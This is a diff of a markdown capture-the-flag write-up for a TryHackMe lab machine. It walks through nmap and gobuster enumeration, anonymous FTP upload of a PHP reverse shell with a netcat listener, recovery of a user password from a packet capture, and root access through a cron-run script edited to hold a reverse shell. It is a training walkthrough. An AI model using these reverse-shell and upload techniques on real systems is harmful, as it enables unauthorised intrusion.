@@ -6,7 +6,7 @@ pagination_prev: null
 
 ## Task 1: Welcome to Spice Hut!
 ### What is the secret spicy soup recipe?
-- Let's first scan the target using `nmap`.
+Let's first scan the target using `nmap`.
 ```
 $ nmap -sC -sV 10.10.96.227
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 11:24 IST
@@ -45,7 +45,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds
 ```
-- As we can see there are three open ports:
+As we can see there are three open ports:
 
 | Port | Service |
 |--|--|
@@ -53,12 +53,13 @@ Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds
 | 22 | ssh | 
 | 80 | http |
 
-- Let's visit the machine's HTTP port through the browser.
+Let's visit the machine's HTTP port through the browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/aa9f1077-8193-4bba-aa2f-d9c811c0eaa3)
 
-- As we can see, there is nothing of importance on this page.
-- We can try to find other pages or directories using `gobuster`.
+As we can see, there is nothing of importance on this page.
+
+We can try to find other pages or directories using `gobuster`.
 ```
 $ gobuster dir -u http://10.10.96.227 -w /usr/share/wordlists/dirb/common.txt                 
 ===============================================================
@@ -86,8 +87,9 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================
 ```
-- Let's try out the `/files` directory.
-- We can login go to the FTP server of the machine.
+Let's try out the `/files` directory.
+
+We can login go to the FTP server of the machine.
 ```
 $ ftp anonymous@10.10.96.227
 Connected to 10.10.96.227.
@@ -99,8 +101,9 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ```
-- Note that the password for anonymous login is `anonymous`.
-- Let's look around a bit.
+Note that the password for anonymous login is `anonymous`.
+
+Let's look around a bit.
 ```
 ftp> ls
 229 Entering Extended Passive Mode (|||62019|)
@@ -112,13 +115,15 @@ drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
 ftp> cd ftp
 250 Directory successfully changed.
 ```
-- We can upload a reverse shell in this directory.
-- We will be using the `/usr/share/webshells/php/php-reverse-shell.php` script after making some modifications.
+We can upload a reverse shell in this directory.
+
+We will be using the `/usr/share/webshells/php/php-reverse-shell.php` script after making some modifications.
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/0a37e469-dc9c-4e0d-a083-2617e8357d5e)
 
-- We replaced the IP address with our `tun0` address and set the port to a port of our choice.
-- Let's upload the file to the FTP server using `put`.
+We replaced the IP address with our `tun0` address and set the port to a port of our choice.
+
+Let's upload the file to the FTP server using `put`.
 ```
 ftp> put php-reverse-shell.php 
 local: php-reverse-shell.php remote: php-reverse-shell.php
@@ -128,17 +133,18 @@ local: php-reverse-shell.php remote: php-reverse-shell.php
 226 Transfer complete.
 5494 bytes sent in 00:00 (19.80 KiB/s)
 ```
-- Now we have to listen on the `9999` port using `netcat`.
+Now we have to listen on the `9999` port using `netcat`.
 ```
 $ nc -nlvp 9999            
 listening on [any] 9999 ...
 ```
-- Let's go to the `/files/ftp` folder.
+Let's go to the `/files/ftp` folder.
 
 ![5](https://github.com/Knign/Write-ups/assets/110326359/08dd912a-06d9-4ba3-adcd-c588983624ed)
 
-- All we have to do now is execute the `php-reverse-shell.php` file.
-- If we go back to our console, we must have a shell.
+All we have to do now is execute the `php-reverse-shell.php` file.
+
+If we go back to our console, we must have a shell.
 ```
 $ nc -nlvp 9999            
 listening on [any] 9999 ...
@@ -150,14 +156,14 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-- We can stabilize the shell using the following commands:
+We can stabilize the shell using the following commands:
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 CTRL+Z
 stty raw -echo; fg
 ```
-- Let's look for the secret spicy soup recipe.
+Let's look for the secret spicy soup recipe.
 ```
 www-data@startup:/$ ls
 bin   home            lib         mnt         root  srv  vagrant
@@ -165,7 +171,7 @@ boot  incidents       lib64       opt         run   sys  var
 dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
 etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
 ```
-- Here, the `recipe.txt` file seems interesting. We can read it using the `cat` command.
+Here, the `recipe.txt` file seems interesting. We can read it using the `cat` command.
 ```
 www-data@startup:/$ cat recipe.txt 
 Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
@@ -178,18 +184,18 @@ love
 &nbsp;
 
 ### What are the contents of user.txt?
--  We have to go to the `/incidents` directory.
+We have to go to the `/incidents` directory.
 ```
 www-data@startup:/incidents$ ls
 suspicious.pcapng
 ```
-- Let's copy the `suspicious.pcapng` file to the `ftp` directory.
+Let's copy the `suspicious.pcapng` file to the `ftp` directory.
 ```
 www-data@startup:/incidents$ cp suspicious.pcapng /var/www/html/files/ftp/
 www-data@startup:/incidents$ ls /var/www/html/files/ftp/
 php-reverse-shell.php  suspicious.pcapng
 ```
-- Let's look at the ftp login.
+Let's look at the ftp login.
 ```
 ftp> ls
 229 Entering Extended Passive Mode (|||32073|)
@@ -198,7 +204,7 @@ ftp> ls
 -rwxr-xr-x    1 33       33          31224 Dec 06 06:55 suspicious.pcapng
 226 Directory send OK.
 ```
-- We can now download this file using the `get` command.
+We can now download this file using the `get` command.
 ```
 ftp> get suspicious.pcapng
 local: suspicious.pcapng remote: suspicious.pcapng
@@ -208,22 +214,23 @@ local: suspicious.pcapng remote: suspicious.pcapng
 226 Transfer complete.
 31224 bytes received in 00:00 (79.21 KiB/s)
 ```
-- We can now use Wireshark to analyze the packet capture.
-- In frame 45 we can see that the user has entered some commands.
+We can now use Wireshark to analyze the packet capture.
+
+In frame 45 we can see that the user has entered some commands.
 
 ![7](https://github.com/Knign/Write-ups/assets/110326359/9388df3c-90f7-4506-a642-6fab020f5913)
 
-- Let `Follow TCP Stream`.
+Let `Follow TCP Stream`.
 
 ![8](https://github.com/Knign/Write-ups/assets/110326359/9f4c6323-2aa5-42ad-b864-86a42e678cca)
 
-- The password for the `lennie` user is `c4ntg3t3n0ughsp1c3`.
+The password for the `lennie` user is `c4ntg3t3n0ughsp1c3`.
 ```
 www-data@startup:/$ su lennie
 Password: 
 lennie@startup:/$ 
 ```
-- We can now go to `/home/lennie` and get the flag.
+We can now go to `/home/lennie` and get the flag.
 ```
 lennie@startup:/$ cd /home/lennie/
 lennie@startup:~$ ls
@@ -239,36 +246,38 @@ THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 &nbsp;
 
 ### What are the contents of root.txt?
-- Let's check what's inside the `scripts/` directory.
+Let's check what's inside the `scripts/` directory.
 ```
 lennie@startup:~$ cd scripts/
 lennie@startup:~/scripts$ ls
 planner.sh  startup_list.txt
 ```
-- We can check what the `planner.sh` file is doing using `cat`.
+We can check what the `planner.sh` file is doing using `cat`.
 ```
 lennie@startup:~/scripts$ cat planner.sh 
 #!/bin/bash
 echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 ```
-- We can see that it execute the `/etc/print.sh` file.
-- Let's check that file out.
+We can see that it execute the `/etc/print.sh` file.
+
+Let's check that file out.
 ```
 lennie@startup:~/scripts$ ls -la /etc/ | grep "print.sh"
 -rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
 ```
-- So we can execute the `print.sh` file as `lennie`.
-- But before that let's modify it to get a reverse shell.
-- We can get a bash reverse shell from Revshells.com.
+So we can execute the `print.sh` file as `lennie`.
+But before that let's modify it to get a reverse shell.
+
+We can get a bash reverse shell from Revshells.com.
 
 ![9](https://github.com/Knign/Write-ups/assets/110326359/758e26e5-4b82-4d06-98b0-8ae390c79abe)
 
-- The IP address is our `tun0` address.
+The IP address is our `tun0` address.
 
 ![10](https://github.com/Knign/Write-ups/assets/110326359/8ee962c7-0491-46ec-9b75-33e86dac1652)
 
-- After saving the changes, we can listen on port `9998` and  run the `planner.sh` file.
+After saving the changes, we can listen on port `9998` and  run the `planner.sh` file.
 ```
 $ nc -lvnp 9998
 listening on [any] 9998 ...
@@ -276,7 +285,7 @@ connect to [10.17.48.138] from (UNKNOWN) [10.10.244.57] 43162
 sh: 0: can't access tty; job control turned off
 #
 ```
-- Let's get the root flag.
+Let's get the root flag.
 ```
 # ls
 root.txt
